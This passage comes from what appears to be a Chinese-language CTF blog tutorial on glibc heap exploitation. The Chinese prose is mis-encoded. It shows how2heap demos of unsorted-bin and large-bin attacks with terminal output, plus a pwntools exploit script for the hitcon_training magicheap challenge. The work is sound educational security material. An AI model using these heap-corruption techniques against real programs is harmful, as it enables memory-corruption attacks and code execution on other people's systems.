p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h3><p>åœ¨libcçš„æºç é‡Œé¢æˆ‘ä»¬çœ‹åˆ°mallocå‡½æ•°åœ¨å¯»æ‰¾unsortedbinä¸­çš„chunkçš„æ—¶å€™ï¼Œç”±äºunsortedbinçš„è§„åˆ™æ˜¯<code>FIFO</code>ï¼Œå³å…ˆè¿›å…ˆå‡ºï¼Œmallocé¦–å…ˆä¼šæ‰¾åˆ°unsortedbiné‡Œå­˜æ”¾çš„bkæŒ‡é’ˆï¼Œæ‰¾åˆ°æœ€å¼€å§‹é“¾å…¥çš„chunkï¼Œä¹Ÿå°±æ˜¯é“¾é‡Œæœ€åçš„chunkï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¯¥å †å—çš„å¤´å’Œå†…å®¹ï¼Œé‚£ä¹ˆå…¶bkæ‰€æŒ‡å‘çš„å°±æœ‰å¯èƒ½æ˜¯æˆ‘ä»¬ä¼ªé€ çš„fake_chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><span class="hljs-comment">// å†æ¬¡è¯·æ±‚é˜²æ­¢victimä¸top chunkåˆå¹¶</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br><br><span class="hljs-built_in">free</span>(victim);<br><br><br><span class="hljs-comment">// åœ¨æ ˆä¸Šä¼ªé€ ä¸€ä¸ªchunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br><span class="hljs-comment">// sizeè®¾ç½®æˆä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤§å°ï¼ŒbkæŒ‡é’ˆæŒ‡å‘ä»»ä½•ä¸€ä¸ªå¯å†™çš„åœ°å€</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br><br>stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<span class="hljs-comment">// åŒ…å«chunkçš„å¤´éƒ¨</span><br><br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<span class="hljs-comment">// bkæŒ‡é’ˆæŒ‡å‘è‡ªå·±</span><br><br><br><br><span class="hljs-comment">//------------VULNERABILITY-----------</span><br><span class="hljs-comment">// å­˜åœ¨ä¸€ä¸ªæ¼æ´ä¿®æ”¹victimçš„sizeå’ŒbkæŒ‡é’ˆ</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br><span class="hljs-comment">// sizeå¿…é¡»å’Œè¯·æ±‚çš„sizeä¸åŒï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè¿”å›fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br><br>victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<span class="hljs-comment">// ä¿®æ”¹size</span><br><br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br><span class="hljs-comment">//------------------------------------</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br><br><span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><span class="hljs-comment">// è¿™æ—¶å€™è¿”å›çš„å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„chunk</span><br><br><br><span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br><span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br><br><br>assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_into_stack<br>Allocating the victim chunk<br>Allocating another chunk to avoid consolidating the top chunk with the small one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br>Freeing the chunk 0x1227420, it will be inserted in the unsorted bin<br>Create a fake chunk on the stackSet size <span class="hljs-keyword">for</span> next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer<br>Size should be different from the next request size to <span class="hljs-keyword">return</span> fake_chunk and need to pass the check 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;system_mem<br>Now next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk: 0x7ffd067c2390<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x100</span>)</span>: 0x7ffd067c2390<br>Nice jump d00d<br></code></pre></td></tr></table></figure><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><p>ç”±äºunsortedbinå–å‡ºå †å—çš„æ—¶å€™ï¼Œä¼šå°†å…¶bkæ‰€æŒ‡å‘çš„å †å—å†™å…¥å½“å‰unsortedçš„bkæŒ‡é’ˆï¼ŒåŒæ—¶ä¼šå°†è¯¥unsortedbinä¸­çš„fdæŒ‡é’ˆå†™å…¥ä¸‹ä¸€ä¸ªå †å—çš„fdæŒ‡é’ˆåŒºåŸŸï¼Œä½¿å¾—ç›®æ ‡åœ°å€é‡Œå†™å…¥äº†è¶…å¤§çš„å€¼ï¼ˆunsortedbinçš„fdçš„å€¼ï¼‰ï¼Œå¦‚ä¸‹ï¼š</p><ul><li><code>victim = unsorted_chunks(av)-&gt;bk</code></li><li><code>bck = victim-&gt;bk = p-&gt;bk = target_addr-16</code></li><li><code>unsorted_chunks(av)-&gt;bk = bck = target_addr-16</code></li><li><code>bck-&gt;fd = *(target_addr -16+16) = unsorted_chunks(av);</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);<br><span class="hljs-comment">// è¯¥æ”»å‡»æ–¹æ³•å¯ä»¥å‘æ ˆé‡Œå†™å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ— ç¬¦å·å€¼</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><br>   <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><span class="hljs-comment">// ä¸»è¦ç”¨äºè¾…åŠ©å…¶ä»–çš„æ”»å‡»æ‰‹æ®µ</span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br><br><br><span class="hljs-built_in">free</span>(p);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><br>   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br><br><br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<span class="hljs-comment">// ä¿®æ”¹bkæŒ‡é’ˆæŒ‡å‘æ ˆä¸Šçš„åœ°å€</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><br><br><span class="hljs-comment">//------------------------------------</span><br><br><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br><br>   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_attack<br>This file demonstrates unsorted bin attack by write a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, unsorted bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the target we want to rewrite on <span class="hljs-built_in">stack</span>:<br><span class="hljs-number">0x7ffc479ac8c8</span>: <span class="hljs-number">0</span><br><br>Now, we allocate first normal chunk on the heap at: <span class="hljs-number">0x1b38010</span><br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f25ef9afb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 <span class="hljs-params">(in <span class="hljs-number">32</span>-bits machine, it should be target address<span class="hljs-number">-8</span>)</span>:0x7ffc479ac8b8<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again to get the chunk we just <span class="hljs-built_in">free</span>. During this time, the target should have already been rewritten:<br>0x7ffc479ac8c8: 0x7f25ef9afb78<br></code></pre></td></tr></table></figure><h4 id="hitcon-training-magic-heap"><a href="#hitcon-training-magic-heap" class="headerlink" title="hitcon_training_magic_heap"></a>hitcon_training_magic_heap</h4><p>è¯¥é¢˜åªéœ€è¦ä¿®æ”¹magicçš„å€¼å¤§äºä¸€ä¸ªå¸¸æ•°å°±å¯ä»¥è¿›å…¥åé—¨å‡½æ•°ï¼Œè™½ç„¶ä¹Ÿå­˜åœ¨å…¨å±€å˜é‡ï¼Œå¯ä»¥ç”¨unlinkæ¥è§£å†³ï¼Œä½†æ˜¯ä½¿ç”¨<code>unsorted_bin_attack</code>çš„æ‰‹æ³•æ›´ä¸ºç®€å•ã€‚</p><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./magicheap&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_heap</span>(<span class="hljs-params">size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_heap</span>(<span class="hljs-params">idx, size, content</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_heap</span>(<span class="hljs-params">idx</span>):<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 0</span><br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 1</span><br><span class="hljs-comment"># in order not to merge into top chunk</span><br>create_heap(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment"># 2</span><br><br>del_heap(<span class="hljs-number">1</span>)<br><br>magic = <span class="hljs-number">0x6020a0</span><br>fd = <span class="hljs-number">0</span><br>bk = magic - <span class="hljs-number">0x10</span><br><br>edit_heap(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(fd) + p64(bk))<br>create_heap(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;dada&quot;</span>)  <span class="hljs-comment">#trigger unsorted bin attack</span><br>sdla(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;4869&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p>è¯¥æ–¹æ³•å’Œunsorted_binçš„åˆ©ç”¨æ–¹æ³•å·®ä¸å¤šï¼Œéº»çƒ¦çš„æ˜¯å¤šäº†ä¸¤ä¸ªæŒ‡é’ˆï¼Œéœ€è¦æˆ‘ä»¬æœ‰ä¸€ä¸ªå¯ä»¥æ”¹å†™è¢«é‡Šæ”¾å †å—çš„æ¼æ´ï¼Œåˆ©ç”¨çš„æ˜¯unsorted_binä¸­chunkæ”¾å…¥large_binä¸­ç¼ºä¹çš„å®‰å…¨æ€§æ£€æŸ¥ã€‚ä¸»è¦é€»è¾‘æ˜¯å°†ä¸€ä¸ªlarge_chunk_1æ”¾å…¥large_binä¸­ï¼Œç„¶åå†å°†ä¸€ä¸ªlarge_chunk_2æ”¾å…¥unsorted_binä¸­ï¼Œä¿®æ”¹large_chunk_1çš„sizeã€bkå’Œbk_nextsizeï¼Œå½“large_chunk_1çš„å¤§å°å°äºlarge_chunk_2çš„æ—¶å€™è§¦å‘æ¼æ´ï¼Œ<strong>æ³¨æ„éœ€è¦ä¸¤ä¸ªchunkæ˜¯ç›¸é‚»çš„</strong>ï¼Œåˆ©ç”¨çš„é“¾è¡¨æ“ä½œä¸»è¦æœ‰ä»¥ä¸‹å‡ æ¡ï¼š</p><p>ä¿®æ”¹bk_nextsizeçš„æ“ä½œï¼š</p><blockquote><p>è¿™é‡Œvictimæ˜¯large_chunk_2ï¼Œfwdæ˜¯large_chunk_1ã€‚</p></blockquote><ul><li><code>victim-&gt;fd_nextsize = fwd</code></li><li><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code></li><li><code>fwd-&gt;bk_nextsize = victim</code></li><li><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code></li></ul><p>ä¿®æ”¹bkçš„æ“ä½œï¼š</p><blockquote><p>bckæ˜¯large_chunk_1çš„bkæŒ‡é’ˆï¼Œvictimæ˜¯large_chunk_2ã€‚</p></blockquote><ul><li><code>victim-&gt;bk = bck</code></li><li><code>victim-&gt;fd = fwd</code></li><li><code>fwd-&gt;bk = victim</code></li><li><code>bck-&gt;fd = victim</code></li></ul><p>ä¸‹é¢æ˜¯how2heapæºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span 